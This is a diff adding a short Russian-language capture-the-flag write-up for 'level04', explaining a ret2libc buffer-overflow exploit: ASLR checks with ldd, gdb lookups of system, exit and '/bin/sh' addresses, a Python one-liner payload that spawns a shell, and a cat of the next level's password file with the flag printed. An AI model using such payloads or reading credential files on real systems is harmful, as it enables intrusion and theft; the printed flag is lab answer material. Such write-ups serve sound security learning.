@@ -1,0 +1,38 @@
+Эта программа создает дочерний процесс вызовом fork и отслеживает его программой ptrace.
+Родительский процесс ждет, пока дочерний закончитcz, и не позволяет дочернему процессу выполнить системную функцию,
+убивая дочерний процесс при ее при вызове.
+
+Наш эксплоит будет сравнительно простым, мы используем метод ret2libc. Он будет вызывать system("/bin/sh"). 
+Для этого нам необходимо узнать следующее:
+
+1. Включен ли ASLR(address space layout randomization — «рандомизация размещения адресного пространства»)?: 
+        ldd level04
+        вызываем несколько раз. Если вывод одинаковый, значить ASLR отключен,
+        и мы можем использовать ret2libc метод без дополнительной подготовки.
+
+2. Адреса памяти функций системного вызова и возврата, а так же адрес строки "/bin/sh"
+gdb level04
+
+start
+
+print system
+    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+print exit
+    $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+find __libc_start_main,+99999999,"/bin/sh"
+	0xf7f897ec
+	warning: Unable to access target memory at 0xf7fd3b74, halting search.
+	1 pattern found.
+
+
+Script:
+
+(python -c "print 156 * ‘.’ + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]" ; cat) | ./level04
+
+	Give me some shellcode, k
+	whoami
+	level05
+	cat /home/users/level05/.pass
+		3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN										                                        #flag
